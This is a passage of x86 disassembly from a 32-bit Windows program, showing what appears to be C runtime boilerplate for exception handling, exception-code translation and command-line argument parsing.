  402b7b:	b8 01 00 00 00       	mov    $0x1,%eax
  402b80:	74 32                	je     0x402bb4
  402b82:	8b 44 24 14          	mov    0x14(%esp),%eax
  402b86:	8b 48 fc             	mov    -0x4(%eax),%ecx
  402b89:	33 c8                	xor    %eax,%ecx
  402b8b:	e8 38 ec ff ff       	call   0x4017c8
  402b90:	55                   	push   %ebp
  402b91:	8b 68 10             	mov    0x10(%eax),%ebp
  402b94:	8b 50 28             	mov    0x28(%eax),%edx
  402b97:	52                   	push   %edx
  402b98:	8b 50 24             	mov    0x24(%eax),%edx
  402b9b:	52                   	push   %edx
  402b9c:	e8 14 00 00 00       	call   0x402bb5
  402ba1:	83 c4 08             	add    $0x8,%esp
  402ba4:	5d                   	pop    %ebp
  402ba5:	8b 44 24 08          	mov    0x8(%esp),%eax
  402ba9:	8b 54 24 10          	mov    0x10(%esp),%edx
  402bad:	89 02                	mov    %eax,(%edx)
  402baf:	b8 03 00 00 00       	mov    $0x3,%eax
  402bb4:	c3                   	ret
  402bb5:	53                   	push   %ebx
  402bb6:	56                   	push   %esi
  402bb7:	57                   	push   %edi
  402bb8:	8b 44 24 10          	mov    0x10(%esp),%eax
  402bbc:	55                   	push   %ebp
  402bbd:	50                   	push   %eax
  402bbe:	6a fe                	push   $0xfffffffe
  402bc0:	68 70 2b 40 00       	push   $0x402b70
  402bc5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402bcc:	a1 04 30 41 00       	mov    0x413004,%eax
  402bd1:	33 c4                	xor    %esp,%eax
  402bd3:	50                   	push   %eax
  402bd4:	8d 44 24 04          	lea    0x4(%esp),%eax
  402bd8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402bde:	8b 44 24 28          	mov    0x28(%esp),%eax
  402be2:	8b 58 08             	mov    0x8(%eax),%ebx
  402be5:	8b 70 0c             	mov    0xc(%eax),%esi
  402be8:	83 fe ff             	cmp    $0xffffffff,%esi
  402beb:	74 3a                	je     0x402c27
  402bed:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
  402bf2:	74 06                	je     0x402bfa
  402bf4:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  402bf8:	76 2d                	jbe    0x402c27
  402bfa:	8d 34 76             	lea    (%esi,%esi,2),%esi
  402bfd:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  402c00:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  402c04:	89 48 0c             	mov    %ecx,0xc(%eax)
  402c07:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  402c0c:	75 17                	jne    0x402c25
  402c0e:	68 01 01 00 00       	push   $0x101
  402c13:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  402c17:	e8 49 00 00 00       	call   0x402c65
  402c1c:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  402c20:	e8 5f 00 00 00       	call   0x402c84
  402c25:	eb b7                	jmp    0x402bde
  402c27:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402c2b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402c32:	83 c4 18             	add    $0x18,%esp
  402c35:	5f                   	pop    %edi
  402c36:	5e                   	pop    %esi
  402c37:	5b                   	pop    %ebx
  402c38:	c3                   	ret
  402c39:	33 c0                	xor    %eax,%eax
  402c3b:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  402c42:	81 79 04 70 2b 40 00 	cmpl   $0x402b70,0x4(%ecx)
  402c49:	75 10                	jne    0x402c5b
  402c4b:	8b 51 0c             	mov    0xc(%ecx),%edx
  402c4e:	8b 52 0c             	mov    0xc(%edx),%edx
  402c51:	39 51 08             	cmp    %edx,0x8(%ecx)
  402c54:	75 05                	jne    0x402c5b
  402c56:	b8 01 00 00 00       	mov    $0x1,%eax
  402c5b:	c3                   	ret
  402c5c:	53                   	push   %ebx
  402c5d:	51                   	push   %ecx
  402c5e:	bb 30 30 41 00       	mov    $0x413030,%ebx
  402c63:	eb 0b                	jmp    0x402c70
  402c65:	53                   	push   %ebx
  402c66:	51                   	push   %ecx
  402c67:	bb 30 30 41 00       	mov    $0x413030,%ebx
  402c6c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402c70:	89 4b 08             	mov    %ecx,0x8(%ebx)
  402c73:	89 43 04             	mov    %eax,0x4(%ebx)
  402c76:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  402c79:	55                   	push   %ebp
  402c7a:	51                   	push   %ecx
  402c7b:	50                   	push   %eax
  402c7c:	58                   	pop    %eax
  402c7d:	59                   	pop    %ecx
  402c7e:	5d                   	pop    %ebp
  402c7f:	59                   	pop    %ecx
  402c80:	5b                   	pop    %ebx
  402c81:	c2 04 00             	ret    $0x4
  402c84:	ff d0                	call   *%eax
  402c86:	c3                   	ret
  402c87:	8b ff                	mov    %edi,%edi
  402c89:	55                   	push   %ebp
  402c8a:	8b ec                	mov    %esp,%ebp
  402c8c:	51                   	push   %ecx
  402c8d:	51                   	push   %ecx
  402c8e:	a1 04 30 41 00       	mov    0x413004,%eax
  402c93:	33 c5                	xor    %ebp,%eax
  402c95:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402c98:	56                   	push   %esi
  402c99:	e8 10 17 00 00       	call   0x4043ae
  402c9e:	8b f0                	mov    %eax,%esi
  402ca0:	85 f6                	test   %esi,%esi
  402ca2:	0f 84 43 01 00 00    	je     0x402deb
  402ca8:	8b 16                	mov    (%esi),%edx
  402caa:	8b ca                	mov    %edx,%ecx
  402cac:	53                   	push   %ebx
  402cad:	33 db                	xor    %ebx,%ebx
  402caf:	57                   	push   %edi
  402cb0:	8d 82 90 00 00 00    	lea    0x90(%edx),%eax
  402cb6:	3b d0                	cmp    %eax,%edx
  402cb8:	74 0e                	je     0x402cc8
  402cba:	8b 7d 08             	mov    0x8(%ebp),%edi
  402cbd:	39 39                	cmp    %edi,(%ecx)
  402cbf:	74 09                	je     0x402cca
  402cc1:	83 c1 0c             	add    $0xc,%ecx
  402cc4:	3b c8                	cmp    %eax,%ecx
  402cc6:	75 f5                	jne    0x402cbd
  402cc8:	8b cb                	mov    %ebx,%ecx
  402cca:	85 c9                	test   %ecx,%ecx
  402ccc:	74 07                	je     0x402cd5
  402cce:	8b 79 08             	mov    0x8(%ecx),%edi
  402cd1:	85 ff                	test   %edi,%edi
  402cd3:	75 07                	jne    0x402cdc
  402cd5:	33 c0                	xor    %eax,%eax
  402cd7:	e9 0d 01 00 00       	jmp    0x402de9
  402cdc:	83 ff 05             	cmp    $0x5,%edi
  402cdf:	75 0b                	jne    0x402cec
  402ce1:	33 c0                	xor    %eax,%eax
  402ce3:	89 59 08             	mov    %ebx,0x8(%ecx)
  402ce6:	40                   	inc    %eax
  402ce7:	e9 fd 00 00 00       	jmp    0x402de9
  402cec:	83 ff 01             	cmp    $0x1,%edi
  402cef:	0f 84 f1 00 00 00    	je     0x402de6
  402cf5:	8b 46 04             	mov    0x4(%esi),%eax
  402cf8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402cfb:	8b 45 0c             	mov    0xc(%ebp),%eax
  402cfe:	89 46 04             	mov    %eax,0x4(%esi)
  402d01:	83 79 04 08          	cmpl   $0x8,0x4(%ecx)
  402d05:	0f 85 c4 00 00 00    	jne    0x402dcf
  402d0b:	8d 42 24             	lea    0x24(%edx),%eax
  402d0e:	8d 50 6c             	lea    0x6c(%eax),%edx
  402d11:	eb 06                	jmp    0x402d19
  402d13:	89 58 08             	mov    %ebx,0x8(%eax)
  402d16:	83 c0 0c             	add    $0xc,%eax
  402d19:	3b c2                	cmp    %edx,%eax
  402d1b:	75 f6                	jne    0x402d13
  402d1d:	8b 5e 08             	mov    0x8(%esi),%ebx
  402d20:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  402d25:	39 01                	cmp    %eax,(%ecx)
  402d27:	77 4f                	ja     0x402d78
  402d29:	74 44                	je     0x402d6f
  402d2b:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%ecx)
  402d31:	74 33                	je     0x402d66
  402d33:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%ecx)
  402d39:	74 22                	je     0x402d5d
  402d3b:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%ecx)
  402d41:	74 11                	je     0x402d54
  402d43:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%ecx)
  402d49:	75 6f                	jne    0x402dba
  402d4b:	c7 46 08 81 00 00 00 	movl   $0x81,0x8(%esi)
  402d52:	eb 66                	jmp    0x402dba
  402d54:	c7 46 08 86 00 00 00 	movl   $0x86,0x8(%esi)
  402d5b:	eb 5d                	jmp    0x402dba
  402d5d:	c7 46 08 83 00 00 00 	movl   $0x83,0x8(%esi)
  402d64:	eb 54                	jmp    0x402dba
  402d66:	c7 46 08 82 00 00 00 	movl   $0x82,0x8(%esi)
  402d6d:	eb 4b                	jmp    0x402dba
  402d6f:	c7 46 08 84 00 00 00 	movl   $0x84,0x8(%esi)
  402d76:	eb 42                	jmp    0x402dba
  402d78:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%ecx)
  402d7e:	74 33                	je     0x402db3
  402d80:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%ecx)
  402d86:	74 22                	je     0x402daa
  402d88:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%ecx)
  402d8e:	74 11                	je     0x402da1
  402d90:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%ecx)
  402d96:	75 22                	jne    0x402dba
  402d98:	c7 46 08 8d 00 00 00 	movl   $0x8d,0x8(%esi)
  402d9f:	eb 19                	jmp    0x402dba
  402da1:	c7 46 08 8e 00 00 00 	movl   $0x8e,0x8(%esi)
  402da8:	eb 10                	jmp    0x402dba
  402daa:	c7 46 08 85 00 00 00 	movl   $0x85,0x8(%esi)
  402db1:	eb 07                	jmp    0x402dba
  402db3:	c7 46 08 8a 00 00 00 	movl   $0x8a,0x8(%esi)
  402dba:	ff 76 08             	push   0x8(%esi)
  402dbd:	8b cf                	mov    %edi,%ecx
  402dbf:	6a 08                	push   $0x8
  402dc1:	ff 15 60 c1 40 00    	call   *0x40c160
  402dc7:	ff d7                	call   *%edi
  402dc9:	59                   	pop    %ecx
  402dca:	89 5e 08             	mov    %ebx,0x8(%esi)
  402dcd:	eb 10                	jmp    0x402ddf
  402dcf:	ff 71 04             	push   0x4(%ecx)
  402dd2:	89 59 08             	mov    %ebx,0x8(%ecx)
  402dd5:	8b cf                	mov    %edi,%ecx
  402dd7:	ff 15 60 c1 40 00    	call   *0x40c160
  402ddd:	ff d7                	call   *%edi
  402ddf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402de2:	59                   	pop    %ecx
  402de3:	89 46 04             	mov    %eax,0x4(%esi)
  402de6:	83 c8 ff             	or     $0xffffffff,%eax
  402de9:	5f                   	pop    %edi
  402dea:	5b                   	pop    %ebx
  402deb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402dee:	33 cd                	xor    %ebp,%ecx
  402df0:	5e                   	pop    %esi
  402df1:	e8 d2 e9 ff ff       	call   0x4017c8
  402df6:	8b e5                	mov    %ebp,%esp
  402df8:	5d                   	pop    %ebp
  402df9:	c3                   	ret
  402dfa:	a1 9c 3b 41 00       	mov    0x413b9c,%eax
  402dff:	c3                   	ret
  402e00:	8b ff                	mov    %edi,%edi
  402e02:	55                   	push   %ebp
  402e03:	8b ec                	mov    %esp,%ebp
  402e05:	8b 45 08             	mov    0x8(%ebp),%eax
  402e08:	a3 9c 3b 41 00       	mov    %eax,0x413b9c
  402e0d:	5d                   	pop    %ebp
  402e0e:	c3                   	ret
  402e0f:	a1 04 30 41 00       	mov    0x413004,%eax
  402e14:	8b c8                	mov    %eax,%ecx
  402e16:	33 05 a0 3b 41 00    	xor    0x413ba0,%eax
  402e1c:	83 e1 1f             	and    $0x1f,%ecx
  402e1f:	d3 c8                	ror    %cl,%eax
  402e21:	f7 d8                	neg    %eax
  402e23:	1b c0                	sbb    %eax,%eax
  402e25:	f7 d8                	neg    %eax
  402e27:	c3                   	ret
  402e28:	8b ff                	mov    %edi,%edi
  402e2a:	55                   	push   %ebp
  402e2b:	8b ec                	mov    %esp,%ebp
  402e2d:	ff 75 08             	push   0x8(%ebp)
  402e30:	b9 a0 3b 41 00       	mov    $0x413ba0,%ecx
  402e35:	e8 b9 3a 00 00       	call   0x4068f3
  402e3a:	5d                   	pop    %ebp
  402e3b:	c3                   	ret
  402e3c:	8b ff                	mov    %edi,%edi
  402e3e:	55                   	push   %ebp
  402e3f:	8b ec                	mov    %esp,%ebp
  402e41:	51                   	push   %ecx
  402e42:	a1 04 30 41 00       	mov    0x413004,%eax
  402e47:	33 c5                	xor    %ebp,%eax
  402e49:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e4c:	56                   	push   %esi
  402e4d:	8b 35 04 30 41 00    	mov    0x413004,%esi
  402e53:	8b ce                	mov    %esi,%ecx
  402e55:	33 35 a0 3b 41 00    	xor    0x413ba0,%esi
  402e5b:	83 e1 1f             	and    $0x1f,%ecx
  402e5e:	d3 ce                	ror    %cl,%esi
  402e60:	85 f6                	test   %esi,%esi
  402e62:	75 04                	jne    0x402e68
  402e64:	33 c0                	xor    %eax,%eax
  402e66:	eb 0e                	jmp    0x402e76
  402e68:	ff 75 08             	push   0x8(%ebp)
  402e6b:	8b ce                	mov    %esi,%ecx
  402e6d:	ff 15 60 c1 40 00    	call   *0x40c160
  402e73:	ff d6                	call   *%esi
  402e75:	59                   	pop    %ecx
  402e76:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402e79:	33 cd                	xor    %ebp,%ecx
  402e7b:	5e                   	pop    %esi
  402e7c:	e8 47 e9 ff ff       	call   0x4017c8
  402e81:	8b e5                	mov    %ebp,%esp
  402e83:	5d                   	pop    %ebp
  402e84:	c3                   	ret
  402e85:	8b ff                	mov    %edi,%edi
  402e87:	55                   	push   %ebp
  402e88:	8b ec                	mov    %esp,%ebp
  402e8a:	ff 75 08             	push   0x8(%ebp)
  402e8d:	e8 b4 0a 00 00       	call   0x403946
  402e92:	59                   	pop    %ecx
  402e93:	a3 a0 3b 41 00       	mov    %eax,0x413ba0
  402e98:	5d                   	pop    %ebp
  402e99:	c3                   	ret
  402e9a:	8b ff                	mov    %edi,%edi
  402e9c:	55                   	push   %ebp
  402e9d:	8b ec                	mov    %esp,%ebp
  402e9f:	83 ec 0c             	sub    $0xc,%esp
  402ea2:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402ea6:	56                   	push   %esi
  402ea7:	74 1c                	je     0x402ec5
  402ea9:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  402ead:	74 16                	je     0x402ec5
  402eaf:	e8 87 19 00 00       	call   0x40483b
  402eb4:	6a 16                	push   $0x16
  402eb6:	5e                   	pop    %esi
  402eb7:	89 30                	mov    %esi,(%eax)
  402eb9:	e8 85 17 00 00       	call   0x404643
  402ebe:	8b c6                	mov    %esi,%eax
  402ec0:	e9 ef 00 00 00       	jmp    0x402fb4
  402ec5:	53                   	push   %ebx
  402ec6:	57                   	push   %edi
  402ec7:	68 04 01 00 00       	push   $0x104
  402ecc:	be a8 3b 41 00       	mov    $0x413ba8,%esi
  402ed1:	33 ff                	xor    %edi,%edi
  402ed3:	56                   	push   %esi
  402ed4:	57                   	push   %edi
  402ed5:	ff 15 e0 c0 40 00    	call   *0x40c0e0
  402edb:	8b 1d 2c 3e 41 00    	mov    0x413e2c,%ebx
  402ee1:	89 35 30 3e 41 00    	mov    %esi,0x413e30
  402ee7:	85 db                	test   %ebx,%ebx
  402ee9:	74 05                	je     0x402ef0
  402eeb:	66 39 3b             	cmp    %di,(%ebx)
  402eee:	75 02                	jne    0x402ef2
  402ef0:	8b de                	mov    %esi,%ebx
  402ef2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ef5:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402ef8:	50                   	push   %eax
  402ef9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402efc:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402eff:	50                   	push   %eax
  402f00:	57                   	push   %edi
  402f01:	57                   	push   %edi
  402f02:	53                   	push   %ebx
  402f03:	e8 b1 00 00 00       	call   0x402fb9
  402f08:	6a 02                	push   $0x2
  402f0a:	ff 75 f4             	push   -0xc(%ebp)
  402f0d:	ff 75 fc             	push   -0x4(%ebp)
  402f10:	e8 2a 02 00 00       	call   0x40313f
  402f15:	8b f0                	mov    %eax,%esi
  402f17:	83 c4 20             	add    $0x20,%esp
  402f1a:	85 f6                	test   %esi,%esi
  402f1c:	75 0c                	jne    0x402f2a
  402f1e:	e8 18 19 00 00       	call   0x40483b
  402f23:	6a 0c                	push   $0xc
  402f25:	5f                   	pop    %edi
  402f26:	89 38                	mov    %edi,(%eax)
  402f28:	eb 31                	jmp    0x402f5b
  402f2a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402f2d:	50                   	push   %eax
  402f2e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402f31:	50                   	push   %eax
  402f32:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402f35:	8d 04 86             	lea    (%esi,%eax,4),%eax
  402f38:	50                   	push   %eax
  402f39:	56                   	push   %esi
  402f3a:	53                   	push   %ebx
  402f3b:	e8 79 00 00 00       	call   0x402fb9
  402f40:	83 c4 14             	add    $0x14,%esp
  402f43:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  402f47:	75 16                	jne    0x402f5f
  402f49:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402f4c:	48                   	dec    %eax
  402f4d:	a3 1c 3e 41 00       	mov    %eax,0x413e1c
  402f52:	8b c6                	mov    %esi,%eax
  402f54:	8b f7                	mov    %edi,%esi
  402f56:	a3 24 3e 41 00       	mov    %eax,0x413e24
  402f5b:	8b df                	mov    %edi,%ebx
  402f5d:	eb 4a                	jmp    0x402fa9
  402f5f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f62:	89 7d f8             	mov    %edi,-0x8(%ebp)
  402f65:	50                   	push   %eax
  402f66:	56                   	push   %esi
  402f67:	e8 fc 1d 00 00       	call   0x404d68
  402f6c:	8b d8                	mov    %eax,%ebx
  402f6e:	59                   	pop    %ecx
  402f6f:	59                   	pop    %ecx
  402f70:	85 db                	test   %ebx,%ebx
  402f72:	74 05                	je     0x402f79
  402f74:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f77:	eb 26                	jmp    0x402f9f
  402f79:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402f7c:	8b cf                	mov    %edi,%ecx
  402f7e:	8b c2                	mov    %edx,%eax
  402f80:	39 3a                	cmp    %edi,(%edx)
  402f82:	74 08                	je     0x402f8c
  402f84:	8d 40 04             	lea    0x4(%eax),%eax
  402f87:	41                   	inc    %ecx
  402f88:	39 38                	cmp    %edi,(%eax)
  402f8a:	75 f8                	jne    0x402f84
  402f8c:	8b c7                	mov    %edi,%eax
  402f8e:	89 0d 1c 3e 41 00    	mov    %ecx,0x413e1c
  402f94:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402f97:	8b df                	mov    %edi,%ebx
  402f99:	89 15 24 3e 41 00    	mov    %edx,0x413e24
  402f9f:	50                   	push   %eax
  402fa0:	e8 68 0e 00 00       	call   0x403e0d
  402fa5:	59                   	pop    %ecx
  402fa6:	89 7d f8             	mov    %edi,-0x8(%ebp)
  402fa9:	56                   	push   %esi
  402faa:	e8 5e 0e 00 00       	call   0x403e0d
  402faf:	59                   	pop    %ecx
  402fb0:	5f                   	pop    %edi
  402fb1:	8b c3                	mov    %ebx,%eax
  402fb3:	5b                   	pop    %ebx
  402fb4:	5e                   	pop    %esi
  402fb5:	8b e5                	mov    %ebp,%esp
  402fb7:	5d                   	pop    %ebp
  402fb8:	c3                   	ret
  402fb9:	8b ff                	mov    %edi,%edi
  402fbb:	55                   	push   %ebp
  402fbc:	8b ec                	mov    %esp,%ebp
  402fbe:	8b 45 14             	mov    0x14(%ebp),%eax
  402fc1:	83 ec 10             	sub    $0x10,%esp
  402fc4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402fc7:	8b 55 10             	mov    0x10(%ebp),%edx
  402fca:	53                   	push   %ebx
  402fcb:	56                   	push   %esi
  402fcc:	8b 75 0c             	mov    0xc(%ebp),%esi
  402fcf:	33 db                	xor    %ebx,%ebx
  402fd1:	57                   	push   %edi
  402fd2:	8b 7d 18             	mov    0x18(%ebp),%edi
  402fd5:	89 1f                	mov    %ebx,(%edi)
  402fd7:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  402fdd:	85 f6                	test   %esi,%esi
  402fdf:	74 08                	je     0x402fe9
  402fe1:	89 16                	mov    %edx,(%esi)
  402fe3:	83 c6 04             	add    $0x4,%esi
  402fe6:	89 75 0c             	mov    %esi,0xc(%ebp)
  402fe9:	c7 45 f8 20 00 00 00 	movl   $0x20,-0x8(%ebp)
  402ff0:	c7 45 f4 09 00 00 00 	movl   $0x9,-0xc(%ebp)
  402ff7:	6a 22                	push   $0x22
  402ff9:	58                   	pop    %eax
  402ffa:	66 39 01             	cmp    %ax,(%ecx)
  402ffd:	75 0a                	jne    0x403009
  402fff:	84 db                	test   %bl,%bl
  403001:	0f 94 c3             	sete   %bl
  403004:	83 c1 02             	add    $0x2,%ecx
  403007:	eb 1a                	jmp    0x403023
  403009:	ff 07                	incl   (%edi)
  40300b:	85 d2                	test   %edx,%edx
  40300d:	74 09                	je     0x403018
  40300f:	66 8b 01             	mov    (%ecx),%ax
  403012:	66 89 02             	mov    %ax,(%edx)
  403015:	83 c2 02             	add    $0x2,%edx
  403018:	0f b7 01             	movzwl (%ecx),%eax
  40301b:	83 c1 02             	add    $0x2,%ecx
  40301e:	66 85 c0             	test   %ax,%ax
  403021:	74 1f                	je     0x403042
  403023:	84 db                	test   %bl,%bl
  403025:	75 d0                	jne    0x402ff7
  403027:	66 3b 45 f8          	cmp    -0x8(%ebp),%ax
  40302b:	74 09                	je     0x403036
  40302d:	66 3b 45 f4          	cmp    -0xc(%ebp),%ax
  403031:	6a 22                	push   $0x22
  403033:	58                   	pop    %eax
  403034:	75 c4                	jne    0x402ffa
  403036:	85 d2                	test   %edx,%edx
  403038:	74 0b                	je     0x403045
  40303a:	33 c0                	xor    %eax,%eax
  40303c:	66 89 42 fe          	mov    %ax,-0x2(%edx)
  403040:	eb 03                	jmp    0x403045
  403042:	83 e9 02             	sub    $0x2,%ecx
  403045:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403048:	33 c0                	xor    %eax,%eax
  40304a:	88 45 ff             	mov    %al,-0x1(%ebp)
  40304d:	66 39 01             	cmp    %ax,(%ecx)
  403050:	0f 84 da 00 00 00    	je     0x403130
  403056:	0f b7 01             	movzwl (%ecx),%eax
  403059:	66 3b 45 f8          	cmp    -0x8(%ebp),%ax
  40305d:	74 06                	je     0x403065
  40305f:	66 3b 45 f4          	cmp    -0xc(%ebp),%ax
  403063:	75 05                	jne    0x40306a
  403065:	83 c1 02             	add    $0x2,%ecx
  403068:	eb ec                	jmp    0x403056
  40306a:	33 c0                	xor    %eax,%eax
  40306c:	66 39 01             	cmp    %ax,(%ecx)
  40306f:	0f 84 bb 00 00 00    	je     0x403130
  403075:	85 f6                	test   %esi,%esi
  403077:	74 08                	je     0x403081
  403079:	89 16                	mov    %edx,(%esi)
  40307b:	83 c6 04             	add    $0x4,%esi
  40307e:	89 75 0c             	mov    %esi,0xc(%ebp)
  403081:	ff 03                	incl   (%ebx)
  403083:	33 db                	xor    %ebx,%ebx
  403085:	6a 5c                	push   $0x5c
  403087:	5e                   	pop    %esi
  403088:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  40308f:	8b c3                	mov    %ebx,%eax
  403091:	eb 04                	jmp    0x403097
  403093:	83 c1 02             	add    $0x2,%ecx
  403096:	40                   	inc    %eax
  403097:	66 39 31             	cmp    %si,(%ecx)
  40309a:	74 f7                	je     0x403093
  40309c:	6a 22                	push   $0x22
  40309e:	5e                   	pop    %esi
  40309f:	66 39 31             	cmp    %si,(%ecx)
  4030a2:	6a 5c                	push   $0x5c
  4030a4:	5e                   	pop    %esi
  4030a5:	75 38                	jne    0x4030df
  4030a7:	a8 01                	test   $0x1,%al
  4030a9:	75 20                	jne    0x4030cb
  4030ab:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  4030ae:	74 11                	je     0x4030c1
  4030b0:	6a 22                	push   $0x22
  4030b2:	5e                   	pop    %esi
  4030b3:	66 39 71 02          	cmp    %si,0x2(%ecx)
  4030b7:	6a 5c                	push   $0x5c
  4030b9:	5e                   	pop    %esi
  4030ba:	75 05                	jne    0x4030c1
  4030bc:	83 c1 02             	add    $0x2,%ecx
  4030bf:	eb 0a                	jmp    0x4030cb
  4030c1:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  4030c4:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4030c7:	0f 94 45 ff          	sete   -0x1(%ebp)
  4030cb:	8b 7d 18             	mov    0x18(%ebp),%edi
  4030ce:	d1 e8                	shr    $1,%eax
  4030d0:	eb 0d                	jmp    0x4030df
  4030d2:	48                   	dec    %eax
  4030d3:	85 d2                	test   %edx,%edx
  4030d5:	74 06                	je     0x4030dd
  4030d7:	66 89 32             	mov    %si,(%edx)
  4030da:	83 c2 02             	add    $0x2,%edx
  4030dd:	ff 07                	incl   (%edi)
  4030df:	85 c0                	test   %eax,%eax
  4030e1:	75 ef                	jne    0x4030d2
  4030e3:	0f b7 01             	movzwl (%ecx),%eax
  4030e6:	66 85 c0             	test   %ax,%ax
  4030e9:	74 2a                	je     0x403115
  4030eb:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  4030ee:	75 0c                	jne    0x4030fc
  4030f0:	66 3b 45 f8          	cmp    -0x8(%ebp),%ax
  4030f4:	74 1f                	je     0x403115
  4030f6:	66 3b 45 f4          	cmp    -0xc(%ebp),%ax
  4030fa:	74 19                	je     0x403115
  4030fc:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4030ff:	74 0c                	je     0x40310d
  403101:	85 d2                	test   %edx,%edx
  403103:	74 06                	je     0x40310b
  403105:	66 89 02             	mov    %ax,(%edx)
  403108:	83 c2 02             	add    $0x2,%edx
  40310b:	ff 07                	incl   (%edi)
  40310d:	83 c1 02             	add    $0x2,%ecx
  403110:	e9 73 ff ff ff       	jmp    0x403088
  403115:	8b 75 0c             	mov    0xc(%ebp),%esi
  403118:	8b 5d 14             	mov    0x14(%ebp),%ebx
  40311b:	85 d2                	test   %edx,%edx
  40311d:	74 08                	je     0x403127
  40311f:	33 c0                	xor    %eax,%eax
  403121:	66 89 02             	mov    %ax,(%edx)
  403124:	83 c2 02             	add    $0x2,%edx
  403127:	ff 07                	incl   (%edi)
  403129:	33 c0                	xor    %eax,%eax
  40312b:	e9 1d ff ff ff       	jmp    0x40304d
  403130:	85 f6                	test   %esi,%esi
  403132:	74 02                	je     0x403136
  403134:	89 06                	mov    %eax,(%esi)
  403136:	ff 03                	incl   (%ebx)
  403138:	5f                   	pop    %edi
  403139:	5e                   	pop    %esi
  40313a:	5b                   	pop    %ebx
  40313b:	8b e5                	mov    %ebp,%esp
  40313d:	5d                   	pop    %ebp
  40313e:	c3                   	ret
  40313f:	8b ff                	mov    %edi,%edi
  403141:	55                   	push   %ebp
  403142:	8b ec                	mov    %esp,%ebp
  403144:	56                   	push   %esi
  403145:	8b 75 08             	mov    0x8(%ebp),%esi
  403148:	81 fe ff ff ff 3f    	cmp    $0x3fffffff,%esi
  40314e:	72 04                	jb     0x403154
  403150:	33 c0                	xor    %eax,%eax
  403152:	eb 3d                	jmp    0x403191
  403154:	57                   	push   %edi
  403155:	83 cf ff             	or     $0xffffffff,%edi
  403158:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40315b:	33 d2                	xor    %edx,%edx
  40315d:	8b c7                	mov    %edi,%eax
  40315f:	f7 75 10             	divl   0x10(%ebp)
  403162:	3b c8                	cmp    %eax,%ecx
  403164:	73 0d                	jae    0x403173
  403166:	0f af 4d 10          	imul   0x10(%ebp),%ecx
  40316a:	c1 e6 02             	shl    $0x2,%esi
  40316d:	2b fe                	sub    %esi,%edi
  40316f:	3b f9                	cmp    %ecx,%edi
  403171:	77 04                	ja     0x403177
  403173:	33 c0                	xor    %eax,%eax
  403175:	eb 19                	jmp    0x403190
  403177:	8d 04 31             	lea    (%ecx,%esi,1),%eax
  40317a:	6a 01                	push   $0x1
  40317c:	50                   	push   %eax
  40317d:	e8 56 0d 00 00       	call   0x403ed8
  403182:	6a 00                	push   $0x0
  403184:	8b f0                	mov    %eax,%esi
  403186:	e8 82 0c 00 00       	call   0x403e0d
  40318b:	83 c4 0c             	add    $0xc,%esp
  40318e:	8b c6                	mov    %esi,%eax
  403190:	5f                   	pop    %edi
  403191:	5e                   	pop    %esi
  403192:	5d                   	pop    %ebp
  403193:	c3                   	ret
  403194:	8b ff                	mov    %edi,%edi
  403196:	55                   	push   %ebp
  403197:	8b ec                	mov    %esp,%ebp
  403199:	5d                   	pop    %ebp
  40319a:	e9 fb fc ff ff       	jmp    0x402e9a
  40319f:	83 3d b8 3d 41 00 00 	cmpl   $0x0,0x413db8
  4031a6:	74 03                	je     0x4031ab
  4031a8:	33 c0                	xor    %eax,%eax
  4031aa:	c3                   	ret
  4031ab:	56                   	push   %esi
  4031ac:	57                   	push   %edi
  4031ad:	e8 1d 24 00 00       	call   0x4055cf
  4031b2:	8b f0                	mov    %eax,%esi
  4031b4:	85 f6                	test   %esi,%esi
  4031b6:	75 05                	jne    0x4031bd
